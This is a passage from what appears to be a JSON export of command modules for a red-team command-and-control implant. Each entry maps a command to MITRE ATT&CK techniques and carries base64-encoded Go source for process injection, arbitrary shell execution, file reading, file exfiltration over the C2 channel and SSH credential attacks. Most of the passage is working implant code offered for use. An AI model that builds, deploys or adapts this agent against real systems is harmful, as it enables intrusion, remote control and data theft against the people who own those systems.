ciAhPSBLRVJOX1NVQ0NFU1MpCi8vICAgICB7Ci8vCi8vIAkJcmV0dXJuICgtMyk7Ci8vICAgICB9Ci8vCi8vICAgICByZXR1cm4gKDApOwovLwovLyB9CmltcG9ydCAiQyIKCnR5cGUgRGFyd2luSW5qZWN0aW9uIHN0cnVjdCB7CglUYXJnZXQgICAgICBpbnQKCVN1Y2Nlc3NmdWwgIGJvb2wKCVBheWxvYWQgICAgIFtdYnl0ZQoJTGlicmFyeVBhdGggc3RyaW5nCn0KCmZ1bmMgKGwgKkRhcndpbkluamVjdGlvbikgVGFyZ2V0UGlkKCkgaW50IHsKCXJldHVybiBsLlRhcmdldAp9CgpmdW5jIChsICpEYXJ3aW5JbmplY3Rpb24pIFN1Y2Nlc3MoKSBib29sIHsKCXJldHVybiBsLlN1Y2Nlc3NmdWwKfQoKZnVuYyAobCAqRGFyd2luSW5qZWN0aW9uKSBTaGVsbGNvZGUoKSBbXWJ5dGUgewoJcmV0dXJuIGwuUGF5bG9hZAp9CgpmdW5jIChsICpEYXJ3aW5JbmplY3Rpb24pIFNoYXJlZExpYigpIHN0cmluZyB7CglyZXR1cm4gbC5MaWJyYXJ5UGF0aAp9CgpmdW5jIGluamVjdExpYnJhcnkocGlkIGludCwgcGF0aCBzdHJpbmcpIChEYXJ3aW5JbmplY3Rpb24sIGVycm9yKSB7CglyZXMgOj0gRGFyd2luSW5qZWN0aW9ue30KCWkgOj0gQy5pbnQocGlkKQoJY3BhdGggOj0gQy5DU3RyaW5nKHBhdGgpCgoJciA6PSBDLmluamVjdChpLCBjcGF0aCkKCXJlcy5TdWNjZXNzZnVsID0gdHJ1ZQoJaWYgciAhPSAwIHsKCQlyZXMuU3VjY2Vzc2Z1bCA9IGZhbHNlCgl9CglyZXR1cm4gcmVzLCBuaWwKfQo="
            },
            {
              "libinject_linux.go": "Ly8gK2J1aWxkIGxpbnV4CgpwYWNrYWdlIGxpYmluamVjdAoKLyoKI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8ZXJybm8uaD4KCnN0YXRpYyBGSUxFICpjZ29fZ2V0X3N0ZGluKHZvaWQpICB7IHJldHVybiBzdGRpbjsgIH0Kc3RhdGljIEZJTEUgKmNnb19nZXRfc3Rkb3V0KHZvaWQpIHsgcmV0dXJuIHN0ZG91dDsgfQpzdGF0aWMgRklMRSAqY2dvX2dldF9zdGRlcnIodm9pZCkgeyByZXR1cm4gc3RkZXJyOyB9CiovCgovKgpOb3RlOiBCZWNhdXNlIHRoaXMgaXMgY3VycmVudGx5IG5vdC1vcGVyYXRpb25hbCwKCSAgbGluZXMgMjEtMjYgYW5kIDUxLTcwIGhhdmUgYmVlbiBjb21tZW50ZWQgb3V0LgoqLwoKLy8gaW1wb3J0ICgKLy8gCSJDIgovLyAJInVuc2FmZSIKLy8gKQoKLy8gdHlwZSBGaWxlIEMuRklMRQoKdHlwZSBMaW51eEluamVjdGlvbiBzdHJ1Y3QgewoJVGFyZ2V0ICAgICAgaW50CglTdWNjZXNzZnVsICBib29sCglQYXlsb2FkICAgICBbXWJ5dGUKCUxpYnJhcnlQYXRoIHN0cmluZwp9CgpmdW5jIChsICpMaW51eEluamVjdGlvbikgVGFyZ2V0UGlkKCkgaW50IHsKCXJldHVybiBsLlRhcmdldAp9CgpmdW5jIChsICpMaW51eEluamVjdGlvbikgU3VjY2VzcygpIGJvb2wgewoJcmV0dXJuIGwuU3VjY2Vzc2Z1bAp9CgpmdW5jIChsICpMaW51eEluamVjdGlvbikgU2hlbGxjb2RlKCkgW11ieXRlIHsKCXJldHVybiBsLlBheWxvYWQKfQoKZnVuYyAobCAqTGludXhJbmplY3Rpb24pIFNoYXJlZExpYigpIHN0cmluZyB7CglyZXR1cm4gbC5MaWJyYXJ5UGF0aAp9CgovLyBmdW5jIE9wZW4ocGF0aCwgbW9kZSBzdHJpbmcpICpGaWxlIHsKLy8gCWNwYXRoLCBjbW9kZSA6PSBDLkNTdHJpbmcocGF0aCksIEMuQ1N0cmluZyhtb2RlKQovLyAJZGVmZXIgQy5mcmVlKHVuc2FmZS5Qb2ludGVyKGNwYXRoKSkKLy8gCWRlZmVyIEMuZnJlZSh1bnNhZmUuUG9pbnRlcihjbW9kZSkpCgovLyAJcmV0dXJuICgqRmlsZSkoQy5mb3BlbihjcGF0aCwgY21vZGUpKQovLyB9CgovLyBmdW5jIChmICpGaWxlKSBQdXQoc3RyIHN0cmluZykgewovLyAJY3N0ciA6PSBDLkNTdHJpbmcoc3RyKQovLyAJZGVmZXIgQy5mcmVlKHVuc2FmZS5Qb2ludGVyKGNzdHIpKQoKLy8gCUMuZnB1dHMoY3N0ciwgKCpDLkZJTEUpKGYpKQovLyAJcmV0dXJuCi8vIH0KCi8vIGZ1bmMgKGYgKkZpbGUpIEdldChuIGludCkgc3RyaW5nIHsKLy8gCWNidWYgOj0gbWFrZShbXUMuY2hhciwgbikKLy8gCXJldHVybiBDLkdvU3RyaW5nKEMuZmdldHMoJmNidWZbMF0sIEMuaW50KG4pLCAoKkMuRklMRSkoZikpKQovLyB9CgpmdW5jIGluamVjdExpYnJhcnkocGlkIGludCwgcGF0aCBzdHJpbmcpIChMaW51eEluamVjdGlvbiwgZXJyb3IpIHsKCXJlcyA6PSBMaW51eEluamVjdGlvbnt9CgkvKm9sZHJlZ3MgOj0gc3lzY2FsbC5QdHJhY2VSZWdze30KCgkvLyBUcnkgdG8gYXR0YWNoIHRvIHRoZSB0YXJnZXQgcHJvY2VzcwoJdHJhY2VlSGFuZGxlLCBlcnIgOj0gcHRyYWNlLkF0dGFjaChwaWQpCgoJaWYgZXJyICE9IG5pbCB7CgkJcmV0dXJuIHJlcywgZXJyCgl9CgoJdmFyIHcgc3lzY2FsbC5XYWl0U3RhdHVzCglyIDo9IHN5c2NhbGwuUnVzYWdle30KCgkvLyB3YWl0IGZvciB0aGUgdGFyZ2V0IHByb2Nlc3MgdG8gc2lnbmFsCgl3cGlkLCBlcnIgOj0gc3lzY2FsbC5XYWl0NChwaWQsICZ3LCAwLCAmcikKCWxvZy5QcmludGxuKCJQaWQgIiwgd3BpZCkKCWlmIGVyciAhPSBuaWwgewoJCXJldHVybiByZXMsIGVycgoJfQoKCS8vIEdldCB0aGUgcmVnaXN0ZXJzIHRvIHNhdmUgdGhlaXIgc3RhdGUKCXJlZ2lzdGVycywgZXJyIDo9IHRyYWNlZUhhbmRsZS5HZXRSZWdzKCkKCglpZiBlcnIgIT0gbmlsIHsKCQlyZXR1cm4gcmVzLCBlcnIKCX0KCglvbGRyZWdzID0gcmVnaXN0ZXJzCgoJLy9vbGRjb2RlIDo9IEMubWFsbG9jKEMuc2l6ZW9mX2NoYXIgKiA5MDc2KQoJKi8KCXJlcy5TdWNjZXNzZnVsID0gZmFsc2UKCXJldHVybiByZXMsIG5pbAp9Cg=="
            },
            {
              "libinject.go": "cGFja2FnZSBsaWJpbmplY3QKCmltcG9ydCAoCgkiZW5jb2RpbmcvanNvbiIKCSJmbXQiCgoJInBrZy91dGlscy9zdHJ1Y3RzIgoJInN5bmMiCgkicGtnL3Byb2ZpbGVzIgopCgp2YXIgbXUgc3luYy5NdXRleAoKLy8gSW5qZWN0IEMgc291cmNlIHRha2VuIGZyb206IGh0dHA6Ly93d3cubmV3b3N4Ym9vay5jb20vc3JjLmpsP3RyZWU9bGlzdGluZ3MmZmlsZT1pbmplY3QuYwp0eXBlIEluamVjdGlvbiBpbnRlcmZhY2UgewoJVGFyZ2V0UGlkKCkgaW50CglTaGVsbGNvZGUoKSBbXWJ5dGUKCVN1Y2Nlc3MoKSBib29sCglTaGFyZWRMaWIoKSBzdHJpbmcKfQoKdHlwZSBBcmd1bWVudHMgc3RydWN0IHsKCVBJRCAgICAgICAgIGludCAgICBganNvbjoicGlkImAKCUxpYnJhcnlQYXRoIHN0cmluZyBganNvbjoibGlicmFyeSJgCn0KCmZ1bmMgUnVuKHRhc2sgc3RydWN0cy5UYXNrKSB7Cgltc2cgOj0gc3RydWN0cy5SZXNwb25zZXt9Cgltc2cuVGFza0lEID0gdGFzay5UYXNrSUQKCglhcmdzIDo9IEFyZ3VtZW50c3t9CgllcnIgOj0ganNvbi5Vbm1hcnNoYWwoW11ieXRlKHRhc2suUGFyYW1zKSwgJmFyZ3MpCgoJaWYgZXJyICE9IG5pbCB7CgkJbXNnLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKQoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoKCXJlc3VsdCwgZXJyIDo9IGluamVjdExpYnJhcnkoYXJncy5QSUQsIGFyZ3MuTGlicmFyeVBhdGgpCgoJaWYgZXJyICE9IG5pbCB7CgkJbXNnLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKQoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoKCWlmIHJlc3VsdC5TdWNjZXNzKCkgewoJCW1zZy5Vc2VyT3V0cHV0ID0gZm10LlNwcmludGYoIlN1Y2Nlc3NmdWxseSBpbmplY3RlZCAlcyBpbmplY3Rpb24gaW50byBwaWQ6ICVkICIsIGFyZ3MuTGlicmFyeVBhdGgsIGFyZ3MuUElEKQoJfSBlbHNlIHsKCQltc2cuVXNlck91dHB1dCA9IGZtdC5TcHJpbnRmKCJGYWlsZWQgdG8gaW5qZWN0ICVzIGludG8gcGlkOiAlZCAiLCBhcmdzLkxpYnJhcnlQYXRoLCBhcmdzLlBJRCkKCX0KCgltc2cuQ29tcGxldGVkID0gdHJ1ZQoJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJbXUuTG9jaygpCglwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgltdS5VbmxvY2soKQoJcmV0dXJuCn0K"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "download \/remote\/path\/to\/file",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Download a file from the target",
          "cmd": "download",
          "parameters": [],
          "attack": [
            {
              "t_num": "T1022",
              "attack_name": "Data Encrypted"
            },
            {
              "t_num": "T1030",
              "attack_name": "Data Transfer Size Limits"
            },
            {
              "t_num": "T1041",
              "attack_name": "Exfiltration Over Command and Control Channel"
            }
          ],
          "artifacts": [],
          "files": [],
          "transforms": [],
          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2VzKXsNCiAgaWYocmVzcG9uc2VzLmxlbmd0aCA9PSAyKXsNCiAgICB0cnl7DQogICAgICAgIHZhciBzdGF0dXMgPSBKU09OLnBhcnNlKHJlc3BvbnNlc1swXVsncmVzcG9uc2UnXSk7DQogICAgfWNhdGNoKGVycm9yKXsNCiAgICAgICByZXR1cm4gSlNPTi5zdHJpbmdpZnkoSlNPTi5wYXJzZShyZXNwb25zZXMpLCBudWxsLCAyKTs7DQogICAgfQ0KICAgIGlmKHN0YXR1cy5oYXNPd25Qcm9wZXJ0eSgnaWQnKSl7DQogICAgICB2YXIgb3V0cHV0ID0gIjxkaXYgY2xhc3M9J2NhcmQnPjxkaXYgY2xhc3M9J2NhcmQtaGVhZGVyIGJvcmRlciBib3JkZXItZGFyayBzaGFkb3cnPkZpbmlzaGVkIERvd25sb2FkaW5nIDxzcGFuIGNsYXNzPSdkaXNwbGF5Jz4iICsgdGFza1sncGFyYW1zJ10gKyAiPC9zcGFuPi4gQ2xpY2sgPGEgaHJlZj0nL2FwaS92MS40L2ZpbGVzL2Rvd25sb2FkLyIgKyBzdGF0dXNbJ2FnZW50X2ZpbGVfaWQnXSArICInPmhlcmU8L2E+IHRvIGRvd25sb2FkPC9kaXY+PC9kaXY+IjsNCiAgICAgIHJldHVybiBvdXRwdXQ7DQogICAgfQ0KICB9DQogIHJldHVybiBKU09OLnN0cmluZ2lmeShKU09OLnBhcnNlKHJlc3BvbnNlcyksIG51bGwsIDIpOw0KfQ=="
        },
        {
          "needs_admin": false,
          "help_cmd": "exit",
          "version": 1,
          "is_exit": true,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Exit the current session and kill the agent",
          "cmd": "exit",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "cd [new directory]",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Change working directory (can be relative, but no ~)",
          "cmd": "cd",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "cat [file path]",
          "version": 13,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Cat a file.",
          "cmd": "cat",
          "parameters": [],
          "attack": [
            {
              "t_num": "T1005",
              "attack_name": "Data from Local System"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "cat.go": "cGFja2FnZSBjYXQKIAppbXBvcnQgKAoJIm9zIgoJInBrZy91dGlscy9zdHJ1Y3RzIgoJInBrZy9wcm9maWxlcyIKCSJlbmNvZGluZy9qc29uIgoJInN5bmMiCikKCnZhciBtdSBzeW5jLk11dGV4CgovL1J1biAtIHBhY2thZ2UgZnVuY3Rpb24gdG8gcnVuIGNhdApmdW5jIFJ1bih0YXNrIHN0cnVjdHMuVGFzaykgewoJCglmLCBlcnIgOj0gb3MuT3Blbih0YXNrLlBhcmFtcykKCgltc2cgOj0gc3RydWN0cy5SZXNwb25zZXt9Cgltc2cuVGFza0lEID0gdGFzay5UYXNrSUQKCWlmIGVyciAhPSBuaWwgewoJCQoJCW1zZy5Vc2VyT3V0cHV0ID0gZXJyLkVycm9yKCkKCQltc2cuQ29tcGxldGVkID0gdHJ1ZQoJCW1zZy5TdGF0dXMgPSAiZXJyb3IiCgoJCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCQltdS5Mb2NrKCkKCQlwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgkJbXUuVW5sb2NrKCkKCQlyZXR1cm4KCX0KCglpbmZvLCBlcnIgOj0gZi5TdGF0KCkKCglpZiBlcnIgIT0gbmlsIHsKCQkKCQltc2cuVXNlck91dHB1dCA9IGVyci5FcnJvcigpCgkJbXNnLkNvbXBsZXRlZCA9IHRydWUKCQltc2cuU3RhdHVzID0gImVycm9yIgoKCQlyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgkJbXUuTG9jaygpCgkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CgoJZGF0YSA6PSBtYWtlKFtdYnl0ZSwgaW50KGluZm8uU2l6ZSgpKSkKCW4sIGVyciA6PSBmLlJlYWQoZGF0YSkKCWlmIGVyciAhPSBuaWwgJiYgbiA9PSAwIHsKCQkKCQltc2cuVXNlck91dHB1dCA9IGVyci5FcnJvcigpCgkJbXNnLkNvbXBsZXRlZCA9IHRydWUKCQltc2cuU3RhdHVzID0gImVycm9yIgoKCQlyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgkJbXUuTG9jaygpCgkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CgkKCW1zZy5Vc2VyT3V0cHV0ID0gc3RyaW5nKGRhdGEpCgltc2cuQ29tcGxldGVkID0gdHJ1ZQoJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJbXUuTG9jaygpCglwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgltdS5VbmxvY2soKQoJcmV0dXJuCn0K"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "mkdir [path]",
          "version": 3,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Create a new directory.",
          "cmd": "mkdir",
          "parameters": [],
          "attack": [],
          "artifacts": [
            {
              "command_parameter": "null",
              "artifact": "File Create",
              "artifact_string": "Directory created specified by the command line.",
              "replace_string": ""
            }
          ],
          "files": [
            {
              "mkdir.go": "cGFja2FnZSBta2RpcgoKaW1wb3J0ICgKCSJmbXQiCgkib3MiCgoJInBrZy91dGlscy9zdHJ1Y3RzIgoJInN5bmMiCgkicGtnL3Byb2ZpbGVzIgoJImVuY29kaW5nL2pzb24iCikKCnZhciBtdSBzeW5jLk11dGV4CgpmdW5jIFJ1bih0YXNrIHN0cnVjdHMuVGFzaykgewoJbXNnIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJbXNnLlRhc2tJRCA9IHRhc2suVGFza0lECgoJZXJyIDo9IG9zLk1rZGlyKHRhc2suUGFyYW1zLCAwNzc3KQoJaWYgZXJyICE9IG5pbCB7CgkJbXNnLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKQoJCW1zZy5Db21wbGV0ZWQgPSB0cnVlCgkJbXNnLlN0YXR1cyA9ICJlcnJvciIKCgkJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCXByb2ZpbGVzLlRhc2tSZXNwb25zZXMgPSBhcHBlbmQocHJvZmlsZXMuVGFza1Jlc3BvbnNlcywgcmVzcCkKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoKICAgIG1zZy5Db21wbGV0ZWQgPSB0cnVlCgltc2cuVXNlck91dHB1dCA9IGZtdC5TcHJpbnRmKCJDcmVhdGVkIGRpcmVjdG9yeTogJXMiLCB0YXNrLlBhcmFtcykKCXJlc3AsIF8gOj0ganNvbi5NYXJzaGFsKG1zZykKCW11LkxvY2soKQoJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJbXUuVW5sb2NrKCkKCXJldHVybgp9Cg=="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "shell [command]",
          "version": 4,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "execute a shell command with (\"bash -c\" or \"cmd.ex \/c\")",
          "cmd": "shell",
          "parameters": [],
          "attack": [
            {
              "t_num": "T1059",
              "attack_name": "Command-Line Interface"
            }
          ],
          "artifacts": [
            {
              "command_parameter": "null",
              "artifact": "Process Create",
              "artifact_string": "bash -c *\ncmd.exe \/c *",
              "replace_string": "*"
            }
          ],
          "files": [
            {
              "shell.go": "cGFja2FnZSBzaGVsbAoKaW1wb3J0ICgKCSJwa2cvdXRpbHMvc3RydWN0cyIKCSJzeW5jIgoJInBrZy9wcm9maWxlcyIKCSJlbmNvZGluZy9qc29uIgopCgp2YXIgbXUgc3luYy5NdXRleAoKLy9TaGVsbCAtIEludGVyZmFjZSBmb3IgcnVubmluZyBzaGVsbCBjb21tYW5kcwp0eXBlIFNoZWxsIGludGVyZmFjZSB7CglDb21tYW5kKCkgc3RyaW5nCglSZXNwb25zZSgpIFtdYnl0ZQp9CgovL1J1biAtIEZ1bmN0aW9uIHRoYXQgZXhlY3V0ZXMgdGhlIHNoZWxsIGNvbW1hbmQKZnVuYyBSdW4odGFzayBzdHJ1Y3RzLlRhc2spIHsKCW1zZyA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCW1zZy5UYXNrSUQgPSB0YXNrLlRhc2tJRAoJcmVzLCBlcnIgOj0gc2hlbGxFeGVjKHRhc2suUGFyYW1zKQoKCQoJaWYgZXJyICE9IG5pbCB7CgkJbXNnLlVzZXJPdXRwdXQgPSBlcnIuRXJyb3IoKSArICJcbiIgKyBzdHJpbmcocmVzLlJlc3BvbnNlKCkpCgkJbXNnLkNvbXBsZXRlZCA9IHRydWUKCQltc2cuU3RhdHVzID0gImVycm9yIgoKCQlyZXNwLCBfIDo9IGpzb24uTWFyc2hhbChtc2cpCgkJbXUuTG9jaygpCgkJcHJvZmlsZXMuVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChwcm9maWxlcy5UYXNrUmVzcG9uc2VzLCByZXNwKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CgoJbXNnLlVzZXJPdXRwdXQgPSBzdHJpbmcocmVzLlJlc3BvbnNlKCkpCgltc2cuQ29tcGxldGVkID0gdHJ1ZQoJcmVzcCwgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJbXUuTG9jaygpCglwcm9maWxlcy5UYXNrUmVzcG9uc2VzID0gYXBwZW5kKHByb2ZpbGVzLlRhc2tSZXNwb25zZXMsIHJlc3ApCgltdS5VbmxvY2soKQoJcmV0dXJuCn0K"
            },
            {
              "shell_darwin.go": "Ly8gK2J1aWxkIGRhcndpbgoKcGFja2FnZSBzaGVsbAoKaW1wb3J0ICgKCSJmbXQiCgkib3MvZXhlYyIKCSJzdHJpbmdzIgoKCSJnaXRodWIuY29tL2dvb2dsZS9zaGxleCIKCS8vQXBmZWxsIGltcG9ydHMKKQoKLy9EYXJ3aW5TaGVsbCAtIHN0cnVjdCB0byBob2xkIHRoZSB0YXNrIGFuZCByZXN1bHQgb2YgdGhlIHNoZWxsIGNvbW1hbmQKdHlwZSBEYXJ3aW5TaGVsbCBzdHJ1Y3QgewoJVGFzayAgICAgICBzdHJpbmcKCVRhc2tSZXN1bHQgW11ieXRlCn0KCi8vQ29tbWFuZCAtIGludGVyZmFjZSBtZXRob2QgdGhhdCByZXR1cm5zIHRoZSBjb21tYW5kCmZ1bmMgKGQgKkRhcndpblNoZWxsKSBDb21tYW5kKCkgc3RyaW5nIHsKCXJldHVybiBkLlRhc2sKfQoKLy9SZXNwb25zZSAtIGludGVyZmFjZSBtZXRob2QgdGhhdCBob2xkcyB0aGUgcmVzcG9uc2UgdG8gdGhlIGNvbW1hbmQKZnVuYyAoZCAqRGFyd2luU2hlbGwpIFJlc3BvbnNlKCkgW11ieXRlIHsKCXJldHVybiBkLlRhc2tSZXN1bHQKfQoKZnVuYyBzaGVsbEV4ZWMoYyBzdHJpbmcpIChTaGVsbCwgZXJyb3IpIHsKCgljID0gZm10LlNwcmludGYoImJhc2ggLWMgJXMiLCBjKQoJYXJncywgXyA6PSBzaGxleC5TcGxpdChjKQoJY21kIDo9IGV4ZWMuQ29tbWFuZChhcmdzWzBdLCBhcmdzWzFdLCBzdHJpbmdzLkpvaW4oYXJnc1syOl0sICIgIikpCgoJciA6PSAmRGFyd2luU2hlbGx7fQoKCW91dCwgZXJyIDo9IGNtZC5Db21iaW5lZE91dHB1dCgpCgogICAgci5UYXNrID0gYwogICAgci5UYXNrUmVzdWx0ID0gb3V0CgoJaWYgbGVuKG91dCkgPT0gMCAmJiBlcnIgPT0gbmlsIHsKCQlyLlRhc2tSZXN1bHQgPSBbXWJ5dGUoInRhc2sgY29tcGxldGVkIikKICAgIH0KCglyZXR1cm4gciwgZXJyCn0K"
            },
            {
              "shell_linux.go": "Ly8gK2J1aWxkIGxpbnV4CgpwYWNrYWdlIHNoZWxsCgppbXBvcnQgKAoJImZtdCIKCSJvcy9leGVjIgoJInN0cmluZ3MiCgoJImdpdGh1Yi5jb20vZ29vZ2xlL3NobGV4IgopCgovL0xpbnV4U2hlbGwgLSBzdHJ1Y3QgdG8gaG9sZCB0aGUgdGFzayBhbmQgcmVzdWx0IG9mIHRoZSBzaGVsbCBjb21tYW5kCnR5cGUgTGludXhTaGVsbCBzdHJ1Y3QgewoJVGFzayAgICAgICBzdHJpbmcKCVRhc2tSZXN1bHQgW11ieXRlCn0KCi8vQ29tbWFuZCAtIGludGVyZmFjZSBtZXRob2QgdGhhdCByZXR1cm5zIHRoZSBjb21tYW5kCmZ1bmMgKGQgKkxpbnV4U2hlbGwpIENvbW1hbmQoKSBzdHJpbmcgewoJcmV0dXJuIGQuVGFzawp9CgovL1Jlc3BvbnNlIC0gaW50ZXJmYWNlIG1ldGhvZCB0aGF0IGhvbGRzIHRoZSByZXNwb25zZSB0byB0aGUgY29tbWFuZApmdW5jIChkICpMaW51eFNoZWxsKSBSZXNwb25zZSgpIFtdYnl0ZSB7CglyZXR1cm4gZC5UYXNrUmVzdWx0Cn0KCmZ1bmMgc2hlbGxFeGVjKGMgc3RyaW5nKSAoU2hlbGwsIGVycm9yKSB7CgoJYyA9IGZtdC5TcHJpbnRmKCJiYXNoIC1jICVzIiwgYykKCWFyZ3MsIF8gOj0gc2hsZXguU3BsaXQoYykKCWNtZCA6PSBleGVjLkNvbW1hbmQoYXJnc1swXSwgYXJnc1sxXSwgc3RyaW5ncy5Kb2luKGFyZ3NbMjpdLCAiICIpKQoKCXIgOj0gJkxpbnV4U2hlbGx7fQoKCW91dCwgZXJyIDo9IGNtZC5Db21iaW5lZE91dHB1dCgpCgoJci5UYXNrID0gYwogICAgci5UYXNrUmVzdWx0ID0gb3V0CgoJaWYgbGVuKG91dCkgPT0gMCAmJiBlcnIgPT0gbmlsIHsKCQlyLlRhc2tSZXN1bHQgPSBbXWJ5dGUoInRhc2sgY29tcGxldGVkIikKICAgIH0KCglyZXR1cm4gciwgZXJyCn0K"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "sshauth",
          "version": 7,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "SSH to specified host(s) using the designated credentials.",
          "cmd": "sshauth",
          "parameters": [
            {
              "type": "String",
              "hint": "Command to execute on remote systems.",
              "choices": "",
              "required": false,
              "name": "command"
            },
            {
              "type": "String",
              "hint": "SCP remote file destination.",
              "choices": "",
              "required": false,
              "name": "destination"
            },
            {
              "type": "Array",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "hosts"
            },
            {
              "type": "String",
              "hint": "Authenticate to the designated hosts using this password.",
              "choices": "",
              "required": false,
              "name": "password"
            },
            {
              "type": "Number",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "port"
            },
            {
              "type": "String",
              "hint": "Authenticate to the designated hosts using this private key.",
              "choices": "",
              "required": false,
              "name": "private_key"
            },
            {
              "type": "String",
              "hint": "SCP local source file.",
              "choices": "",
              "required": false,
              "name": "source"
            },
            {
              "type": "String",
              "hint": "Authenticate to the designated hosts using this username.",
              "choices": "",
              "required": true,
              "name": "username"
            }
          ],
          "attack": [
            {
              "t_num": "T1110",
              "attack_name": "Brute Force"
            }
          ],
          "artifacts": [],
          "files": [
            {
